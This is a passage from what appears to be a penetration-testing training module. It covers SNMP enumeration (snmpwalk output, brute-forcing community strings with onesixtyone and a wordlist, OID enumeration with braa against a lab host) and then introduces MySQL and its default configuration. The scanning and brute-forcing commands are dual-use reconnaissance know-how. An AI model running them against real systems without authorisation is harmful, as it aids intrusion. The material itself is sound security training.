iso<span class="hljs-meta">.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1</span><span class="hljs-meta">.1</span><span class="hljs-meta">.9</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.9</span> = OID: iso<span class="hljs-meta">.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.6</span><span class="hljs-meta">.3</span><span class="hljs-meta">.13</span><span class="hljs-meta">.3</span><span class="hljs-meta">.1</span><span class="hljs-meta">.3</span>
iso<span class="hljs-meta">.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1</span><span class="hljs-meta">.1</span><span class="hljs-meta">.9</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.10</span> = OID: iso<span class="hljs-meta">.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1</span><span class="hljs-meta">.92</span>
iso<span class="hljs-meta">.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1</span><span class="hljs-meta">.1</span><span class="hljs-meta">.9</span><span class="hljs-meta">.1</span><span class="hljs-meta">.3</span><span class="hljs-meta">.1</span> = STRING: <span class="hljs-string">"The SNMP Management Architecture MIB."</span>
iso<span class="hljs-meta">.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1</span><span class="hljs-meta">.1</span><span class="hljs-meta">.9</span><span class="hljs-meta">.1</span><span class="hljs-meta">.3</span><span class="hljs-meta">.2</span> = STRING: <span class="hljs-string">"The MIB for Message Processing and Dispatching."</span>
iso<span class="hljs-meta">.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1</span><span class="hljs-meta">.1</span><span class="hljs-meta">.9</span><span class="hljs-meta">.1</span><span class="hljs-meta">.3</span><span class="hljs-meta">.3</span> = STRING: <span class="hljs-string">"The management information definitions for the SNMP User-based Security Model."</span>
iso<span class="hljs-meta">.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1</span><span class="hljs-meta">.1</span><span class="hljs-meta">.9</span><span class="hljs-meta">.1</span><span class="hljs-meta">.3</span><span class="hljs-meta">.4</span> = STRING: <span class="hljs-string">"The MIB module for SNMPv2 entities"</span>
iso<span class="hljs-meta">.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1</span><span class="hljs-meta">.1</span><span class="hljs-meta">.9</span><span class="hljs-meta">.1</span><span class="hljs-meta">.3</span><span class="hljs-meta">.5</span> = STRING: <span class="hljs-string">"View-based Access Control Model for SNMP."</span>
iso<span class="hljs-meta">.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1</span><span class="hljs-meta">.1</span><span class="hljs-meta">.9</span><span class="hljs-meta">.1</span><span class="hljs-meta">.3</span><span class="hljs-meta">.6</span> = STRING: <span class="hljs-string">"The MIB module for managing TCP implementations"</span>
iso<span class="hljs-meta">.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1</span><span class="hljs-meta">.1</span><span class="hljs-meta">.9</span><span class="hljs-meta">.1</span><span class="hljs-meta">.3</span><span class="hljs-meta">.7</span> = STRING: <span class="hljs-string">"The MIB module for managing IP and ICMP implementations"</span>
iso<span class="hljs-meta">.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1</span><span class="hljs-meta">.1</span><span class="hljs-meta">.9</span><span class="hljs-meta">.1</span><span class="hljs-meta">.3</span><span class="hljs-meta">.8</span> = STRING: <span class="hljs-string">"The MIB module for managing UDP implementations"</span>
iso<span class="hljs-meta">.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1</span><span class="hljs-meta">.1</span><span class="hljs-meta">.9</span><span class="hljs-meta">.1</span><span class="hljs-meta">.3</span><span class="hljs-meta">.9</span> = STRING: <span class="hljs-string">"The MIB modules for managing SNMP Notification, plus filtering."</span>
iso<span class="hljs-meta">.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1</span><span class="hljs-meta">.1</span><span class="hljs-meta">.9</span><span class="hljs-meta">.1</span><span class="hljs-meta">.3</span><span class="hljs-meta">.10</span> = STRING: <span class="hljs-string">"The MIB module for logging SNMP Notifications."</span>
iso<span class="hljs-meta">.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1</span><span class="hljs-meta">.1</span><span class="hljs-meta">.9</span><span class="hljs-meta">.1</span><span class="hljs-meta">.4</span><span class="hljs-meta">.1</span> = Timeticks: (<span class="hljs-number">0</span>) <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00.00</span>
iso<span class="hljs-meta">.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1</span><span class="hljs-meta">.1</span><span class="hljs-meta">.9</span><span class="hljs-meta">.1</span><span class="hljs-meta">.4</span><span class="hljs-meta">.2</span> = Timeticks: (<span class="hljs-number">0</span>) <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00.00</span>
iso<span class="hljs-meta">.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1</span><span class="hljs-meta">.1</span><span class="hljs-meta">.9</span><span class="hljs-meta">.1</span><span class="hljs-meta">.4</span><span class="hljs-meta">.3</span> = Timeticks: (<span class="hljs-number">0</span>) <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00.00</span>
iso<span class="hljs-meta">.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1</span><span class="hljs-meta">.1</span><span class="hljs-meta">.9</span><span class="hljs-meta">.1</span><span class="hljs-meta">.4</span><span class="hljs-meta">.4</span> = Timeticks: (<span class="hljs-number">0</span>) <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00.00</span>
iso<span class="hljs-meta">.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1</span><span class="hljs-meta">.1</span><span class="hljs-meta">.9</span><span class="hljs-meta">.1</span><span class="hljs-meta">.4</span><span class="hljs-meta">.5</span> = Timeticks: (<span class="hljs-number">0</span>) <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00.00</span>
iso<span class="hljs-meta">.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1</span><span class="hljs-meta">.1</span><span class="hljs-meta">.9</span><span class="hljs-meta">.1</span><span class="hljs-meta">.4</span><span class="hljs-meta">.6</span> = Timeticks: (<span class="hljs-number">0</span>) <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00.00</span>
iso<span class="hljs-meta">.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1</span><span class="hljs-meta">.1</span><span class="hljs-meta">.9</span><span class="hljs-meta">.1</span><span class="hljs-meta">.4</span><span class="hljs-meta">.7</span> = Timeticks: (<span class="hljs-number">0</span>) <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00.00</span>
iso<span class="hljs-meta">.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1</span><span class="hljs-meta">.1</span><span class="hljs-meta">.9</span><span class="hljs-meta">.1</span><span class="hljs-meta">.4</span><span class="hljs-meta">.8</span> = Timeticks: (<span class="hljs-number">0</span>) <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00.00</span>
iso<span class="hljs-meta">.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1</span><span class="hljs-meta">.1</span><span class="hljs-meta">.9</span><span class="hljs-meta">.1</span><span class="hljs-meta">.4</span><span class="hljs-meta">.9</span> = Timeticks: (<span class="hljs-number">0</span>) <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00.00</span>
iso<span class="hljs-meta">.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1</span><span class="hljs-meta">.1</span><span class="hljs-meta">.9</span><span class="hljs-meta">.1</span><span class="hljs-meta">.4</span><span class="hljs-meta">.10</span> = Timeticks: (<span class="hljs-number">0</span>) <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00.00</span>
iso<span class="hljs-meta">.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1</span><span class="hljs-meta">.25</span><span class="hljs-meta">.1</span><span class="hljs-meta">.1</span><span class="hljs-meta">.0</span> = Timeticks: (<span class="hljs-number">3676678</span>) <span class="hljs-number">10</span>:<span class="hljs-number">12</span>:<span class="hljs-number">46.78</span>
iso<span class="hljs-meta">.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1</span><span class="hljs-meta">.25</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.0</span> = Hex-STRING: <span class="hljs-number">07</span> E5 <span class="hljs-number">09</span> <span class="hljs-number">14</span> 0E 2B <span class="hljs-number">2D</span> <span class="hljs-number">00</span> 2B <span class="hljs-number">02</span> <span class="hljs-number">00</span> 
iso<span class="hljs-meta">.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1</span><span class="hljs-meta">.25</span><span class="hljs-meta">.1</span><span class="hljs-meta">.3</span><span class="hljs-meta">.0</span> = INTEGER: <span class="hljs-number">393216</span>
iso<span class="hljs-meta">.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1</span><span class="hljs-meta">.25</span><span class="hljs-meta">.1</span><span class="hljs-meta">.4</span><span class="hljs-meta">.0</span> = STRING: <span class="hljs-string">"BOOT_IMAGE=/boot/vmlinuz-5.11.0-34-generic root=UUID=9a6a5c52-f92a-42ea-8ddf-940d7e0f4223 ro quiet splash"</span>
iso<span class="hljs-meta">.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1</span><span class="hljs-meta">.25</span><span class="hljs-meta">.1</span><span class="hljs-meta">.5</span><span class="hljs-meta">.0</span> = Gauge32: <span class="hljs-number">3</span>
iso<span class="hljs-meta">.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1</span><span class="hljs-meta">.25</span><span class="hljs-meta">.1</span><span class="hljs-meta">.6</span><span class="hljs-meta">.0</span> = Gauge32: <span class="hljs-number">411</span>
iso<span class="hljs-meta">.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1</span><span class="hljs-meta">.25</span><span class="hljs-meta">.1</span><span class="hljs-meta">.7</span><span class="hljs-meta">.0</span> = INTEGER: <span class="hljs-number">0</span>
iso<span class="hljs-meta">.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1</span><span class="hljs-meta">.25</span><span class="hljs-meta">.1</span><span class="hljs-meta">.7</span><span class="hljs-meta">.0</span> = No more variables left <span class="hljs-keyword">in</span> this MIB View (It is past the end of the MIB tree)

...SNIP...

iso<span class="hljs-meta">.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1</span><span class="hljs-meta">.25</span><span class="hljs-meta">.6</span><span class="hljs-meta">.3</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1232</span> = STRING: <span class="hljs-string">"printer-driver-sag-gdi_0.1-7_all"</span>
iso<span class="hljs-meta">.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1</span><span class="hljs-meta">.25</span><span class="hljs-meta">.6</span><span class="hljs-meta">.3</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1233</span> = STRING: <span class="hljs-string">"printer-driver-splix_2.0.0+svn315-7fakesync1build1_amd64"</span>
iso<span class="hljs-meta">.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1</span><span class="hljs-meta">.25</span><span class="hljs-meta">.6</span><span class="hljs-meta">.3</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1234</span> = STRING: <span class="hljs-string">"procps_2:3.3.16-1ubuntu2.3_amd64"</span>
iso<span class="hljs-meta">.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1</span><span class="hljs-meta">.25</span><span class="hljs-meta">.6</span><span class="hljs-meta">.3</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1235</span> = STRING: <span class="hljs-string">"proftpd-basic_1.3.6c-2_amd64"</span>
iso<span class="hljs-meta">.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1</span><span class="hljs-meta">.25</span><span class="hljs-meta">.6</span><span class="hljs-meta">.3</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1236</span> = STRING: <span class="hljs-string">"proftpd-doc_1.3.6c-2_all"</span>
iso<span class="hljs-meta">.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1</span><span class="hljs-meta">.25</span><span class="hljs-meta">.6</span><span class="hljs-meta">.3</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1237</span> = STRING: <span class="hljs-string">"psmisc_23.3-1_amd64"</span>
iso<span class="hljs-meta">.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1</span><span class="hljs-meta">.25</span><span class="hljs-meta">.6</span><span class="hljs-meta">.3</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1238</span> = STRING: <span class="hljs-string">"publicsuffix_20200303.0012-1_all"</span>
iso<span class="hljs-meta">.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1</span><span class="hljs-meta">.25</span><span class="hljs-meta">.6</span><span class="hljs-meta">.3</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1239</span> = STRING: <span class="hljs-string">"pulseaudio_1:13.99.1-1ubuntu3.12_amd64"</span>
iso<span class="hljs-meta">.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1</span><span class="hljs-meta">.25</span><span class="hljs-meta">.6</span><span class="hljs-meta">.3</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1240</span> = STRING: <span class="hljs-string">"pulseaudio-module-bluetooth_1:13.99.1-1ubuntu3.12_amd64"</span>
iso<span class="hljs-meta">.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1</span><span class="hljs-meta">.25</span><span class="hljs-meta">.6</span><span class="hljs-meta">.3</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1241</span> = STRING: <span class="hljs-string">"pulseaudio-utils_1:13.99.1-1ubuntu3.12_amd64"</span>
iso<span class="hljs-meta">.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1</span><span class="hljs-meta">.25</span><span class="hljs-meta">.6</span><span class="hljs-meta">.3</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1242</span> = STRING: <span class="hljs-string">"python-apt-common_2.0.0ubuntu0.20.04.6_all"</span>
iso<span class="hljs-meta">.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1</span><span class="hljs-meta">.25</span><span class="hljs-meta">.6</span><span class="hljs-meta">.3</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1243</span> = STRING: <span class="hljs-string">"python3_3.8.2-0ubuntu2_amd64"</span>
iso<span class="hljs-meta">.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1</span><span class="hljs-meta">.25</span><span class="hljs-meta">.6</span><span class="hljs-meta">.3</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1244</span> = STRING: <span class="hljs-string">"python3-acme_1.1.0-1_all"</span>
iso<span class="hljs-meta">.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1</span><span class="hljs-meta">.25</span><span class="hljs-meta">.6</span><span class="hljs-meta">.3</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1245</span> = STRING: <span class="hljs-string">"python3-apport_2.20.11-0ubuntu27.21_all"</span>
iso<span class="hljs-meta">.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1</span><span class="hljs-meta">.25</span><span class="hljs-meta">.6</span><span class="hljs-meta">.3</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1246</span> = STRING: <span class="hljs-string">"python3-apt_2.0.0ubuntu0.20.04.6_amd64"</span> 

...SNIP...
</code></pre>
<p>In the case of a misconfiguration, we would get approximately the same results from <code>snmpwalk</code> as just shown above. Once we know the community string and the SNMP service that does not require authentication (versions 1, 2c), we can query internal system information like in the previous example.</p>
<p>Here we recognize some Python packages that have been installed on the system. If we do not know the community string, we can use <code>onesixtyone</code> and <code>SecLists</code> wordlists to identify these community strings.</p>
<p><strong>OneSixtyOne</strong></p>
<p>SNMP</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ sudo apt install onesixtyone
root@htb[/htb]$ onesixtyone -c /opt/useful/SecLists/Discovery/SNMP/snmp.txt <span class="hljs-number">10.129</span><span class="hljs-meta">.14</span><span class="hljs-meta">.128</span>

Scanning <span class="hljs-number">1</span> hosts, <span class="hljs-number">3220</span> communities
<span class="hljs-number">10.129</span><span class="hljs-meta">.14</span><span class="hljs-meta">.128</span> [<span class="hljs-meta">public</span>] Linux htb <span class="hljs-number">5.11</span><span class="hljs-meta">.0</span>-<span class="hljs-number">37</span>-generic #<span class="hljs-number">41</span>~<span class="hljs-number">20.04</span><span class="hljs-meta">.2</span>-Ubuntu SMP Fri Sep <span class="hljs-number">24</span> <span class="hljs-number">09</span>:<span class="hljs-number">06</span>:<span class="hljs-number">38</span> UTC <span class="hljs-number">2021</span> x86_64
</code></pre>
<p>Often, when certain community strings are bound to specific IP addresses, they are named with the hostname of the host, and sometimes even symbols are added to these names to make them more challenging to identify. However, if we imagine an extensive network with over 100 different servers managed using SNMP, the labels, in that case, will have some pattern to them. Therefore, we can use different rules to guess them. We can use the tool <a href="https://secf00tprint.github.io/blog/passwords/crunch/advanced/en">crunch</a> to create custom wordlists. Creating custom wordlists is not an essential part of this module, but more details can be found in the module <a href="https://academy.hackthebox.com/course/preview/cracking-passwords-with-hashcat">Cracking Passwords With Hashcat</a>.</p>
<p>Once we know a community string, we can use it with <a href="https://github.com/mteg/braa">braa</a> to brute-force the individual OIDs and enumerate the information behind them.</p>
<p><strong>Braa</strong></p>
<p>SNMP</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ sudo apt install braa
root@htb[/htb]$ braa &lt;community string&gt;@&lt;<span class="hljs-built_in">IP</span>&gt;:.<span class="hljs-number">1.3</span><span class="hljs-meta">.6</span>.*   # Syntax
root@htb[/htb]$ braa <span class="hljs-meta">public</span>@<span class="hljs-number">10.129</span><span class="hljs-meta">.14</span><span class="hljs-meta">.128</span>:.<span class="hljs-number">1.3</span><span class="hljs-meta">.6</span>.*

<span class="hljs-number">10.129</span><span class="hljs-meta">.14</span><span class="hljs-meta">.128</span>:20ms:.<span class="hljs-number">1.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1</span><span class="hljs-meta">.1</span><span class="hljs-meta">.1</span><span class="hljs-meta">.0</span>:Linux htb <span class="hljs-number">5.11</span><span class="hljs-meta">.0</span>-<span class="hljs-number">34</span>-generic #<span class="hljs-number">36</span>~<span class="hljs-number">20.04</span><span class="hljs-meta">.1</span>-Ubuntu SMP Fri Aug <span class="hljs-number">27</span> <span class="hljs-number">08</span>:<span class="hljs-number">06</span>:<span class="hljs-number">32</span> UTC <span class="hljs-number">2021</span> x86_64
<span class="hljs-number">10.129</span><span class="hljs-meta">.14</span><span class="hljs-meta">.128</span>:20ms:.<span class="hljs-number">1.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.0</span>:.<span class="hljs-number">1.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.4</span><span class="hljs-meta">.1</span><span class="hljs-meta">.8072</span><span class="hljs-meta">.3</span><span class="hljs-meta">.2</span><span class="hljs-meta">.10</span>
<span class="hljs-number">10.129</span><span class="hljs-meta">.14</span><span class="hljs-meta">.128</span>:20ms:.<span class="hljs-number">1.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1</span><span class="hljs-meta">.1</span><span class="hljs-meta">.3</span><span class="hljs-meta">.0</span>:<span class="hljs-number">548</span>
<span class="hljs-number">10.129</span><span class="hljs-meta">.14</span><span class="hljs-meta">.128</span>:20ms:.<span class="hljs-number">1.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1</span><span class="hljs-meta">.1</span><span class="hljs-meta">.4</span><span class="hljs-meta">.0</span>:mrb3n@inlanefreight.htb
<span class="hljs-number">10.129</span><span class="hljs-meta">.14</span><span class="hljs-meta">.128</span>:20ms:.<span class="hljs-number">1.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1</span><span class="hljs-meta">.1</span><span class="hljs-meta">.5</span><span class="hljs-meta">.0</span>:htb
<span class="hljs-number">10.129</span><span class="hljs-meta">.14</span><span class="hljs-meta">.128</span>:20ms:.<span class="hljs-number">1.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1</span><span class="hljs-meta">.1</span><span class="hljs-meta">.6</span><span class="hljs-meta">.0</span>:US
<span class="hljs-number">10.129</span><span class="hljs-meta">.14</span><span class="hljs-meta">.128</span>:20ms:.<span class="hljs-number">1.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1</span><span class="hljs-meta">.1</span><span class="hljs-meta">.7</span><span class="hljs-meta">.0</span>:<span class="hljs-number">78</span>
...SNIP...
</code></pre>
<p>Once again, we would like to point out that the independent configuration of the SNMP service will bring us a great variety of different experiences that no tutorial can replace. Therefore, we highly recommend setting up a VM with SNMP, experimenting with it, and trying different configurations. SNMP can be a boon for an I.T. systems administrator as well as a curse for Security analysts and managers alike.</p>
<h2 id="mysql">MySQL</h2>
<hr>
<p><code>MySQL</code> is an open-source SQL relational database management system developed and supported by Oracle. A database is simply a structured collection of data organized for easy use and retrieval. The database system can quickly process large amounts of data with high performance. Within the database, data storage is done in a manner to take up as little space as possible. The database is controlled using the <a href="https://www.w3schools.com/sql/sql\_intro.asp">SQL database language</a>. MySQL works according to the <code>client-server principle</code> and consists of a MySQL server and one or more MySQL clients. The MySQL server is the actual database management system. It takes care of data storage and distribution. The data is stored in tables with different columns, rows, and data types. These databases are often stored in a single file with the file extension <code>.sql</code>, for example, like <code>wordpress.sql</code>.</p>
<p><strong>MySQL Clients</strong></p>
<p>The MySQL clients can retrieve and edit the data using structured queries to the database engine. Inserting, deleting, modifying, and retrieving data, is done using the SQL database language. Therefore, MySQL is suitable for managing many different databases to which clients can send multiple queries simultaneously. Depending on the use of the database, access is possible via an internal network or the public Internet.</p>
<p>One of the best examples of database usage is the CMS WordPress. WordPress stores all created posts, usernames, and passwords in their own database, which is only accessible from the localhost. However, as explained in more detail in the module <a href="https://academy.hackthebox.com/course/preview/introduction-to-web-applications">Introduction to Web Applications</a>, there are database structures that are distributed across multiple servers also.</p>
<p><strong>MySQL Databases</strong></p>
<p>MySQL is ideally suited for applications such as <code>dynamic websites</code>, where efficient syntax and high response speed are essential. It is often combined with a Linux OS, PHP, and an Apache web server and is also known in this combination as <a href="https://en.wikipedia.org/wiki/LAMP\_\(software\_bundle\">LAMP</a>) (Linux, Apache, MySQL, PHP), or when using Nginx, as <a href="https://lemp.io/">LEMP</a>. In a web hosting with MySQL database, this serves as a central instance in which content required by PHP scripts is stored. Among these are:</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>Headers</td>
<td>Texts</td>
<td>Meta tags</td>
<td>Forms</td>
</tr>
<tr>
<td>Customers</td>
<td>Usernames</td>
<td>Administrators</td>
<td>Moderators</td>
</tr>
<tr>
<td>Email addresses</td>
<td>User information</td>
<td>Permissions</td>
<td>Passwords</td>
</tr>
<tr>
<td>External/Internal links</td>
<td>Links to Files</td>
<td>Specific contents</td>
<td>Values</td>
</tr>
</tbody>
</table>
<p>Sensitive data such as passwords can be stored in their plain-text form by MySQL; however, they are generally encrypted beforehand by the PHP scripts using secure methods such as <a href="https://en.citizendium.org/wiki/One-way\_encryption">One-Way-Encryption</a>.</p>
<p><strong>MySQL Commands</strong></p>
<p>A MySQL database translates the commands internally into executable code and performs the requested actions. The web application informs the user if an error occurs during processing, which various <code>SQL injections</code> can provoke. Often, these error descriptions contain important information and confirm, among other things, that the web application interacts with the database in a different way than the developers intended.</p>
<p>The web application sends the generated information back to the client if the data is processed correctly. This information can be the data extracts from a table or records needed for further processing with logins, search functions, etc. SQL commands can display, modify, add or delete rows in tables. In addition, SQL can also change the structure of tables, create or delete relationships and indexes, and manage users.</p>
<p><code>MariaDB</code>, which is often connected with MySQL, is a fork of the original MySQL code. This is because the chief developer of MySQL left the company <code>MySQL AB</code> after it was acquired by <code>Oracle</code> and developed another open-source SQL database management system based on the source code of MySQL and called it MariaDB.</p>
<hr>
<h3 id="default-configuration">Default Configuration</h3>
<p>The management of SQL databases and their configurations is a vast topic. It is so large that entire professions, such as <code>database administrator</code>, deal with almost nothing but databases. These structures become very large quickly, and their planning can become complicated. Among other things, DB management is a core competency for <code>software developers</code> but also <code>information security analysts</code>. To cover this area completely would go beyond the scope of this module. Therefore, we recommend setting up a MySQL/MariaDB instance to experiment with the various configurations to understand the available functionality and configuration options better. Let us have a look at the default configuration of MySQL.</p>
<p><strong>Default Configuration</strong></p>
<p>MySQL</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ sudo apt <span class="hljs-keyword">install</span> mysql-<span class="hljs-keyword">server</span> -y
root@htb[/htb]$ cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -v <span class="hljs-string">"#"</span> | sed -r <span class="hljs-string">'/^\s*$/d'</span>

[<span class="hljs-keyword">client</span>]
port        = <span class="hljs-number">3306</span>
socket        = /<span class="hljs-keyword">var</span>/run/mysqld/mysqld.sock

[mysqld_safe]
pid-<span class="hljs-keyword">file</span>    = /<span class="hljs-keyword">var</span>/run/mysqld/mysqld.pid
socket        = /<span class="hljs-keyword">var</span>/run/mysqld/mysqld.sock
nice        = <span class="hljs-number">0</span>

[mysqld]
<span class="hljs-keyword">skip</span>-host-<span class="hljs-keyword">cache</span>
<span class="hljs-keyword">skip</span>-<span class="hljs-keyword">name</span>-resolve
<span class="hljs-keyword">user</span>        = mysql
pid-<span class="hljs-keyword">file</span>    = /<span class="hljs-keyword">var</span>/run/mysqld/mysqld.pid
socket        = /<span class="hljs-keyword">var</span>/run/mysqld/mysqld.sock
port        = <span class="hljs-number">3306</span>
basedir        = /usr
datadir        = /<span class="hljs-keyword">var</span>/lib/mysql
tmpdir        = /tmp
lc-messages-dir    = /usr/<span class="hljs-keyword">share</span>/mysql
explicit_defaults_for_timestamp

symbolic-links=<span class="hljs-number">0</span>

!includedir /etc/mysql/conf.d/
</code></pre>
<hr>
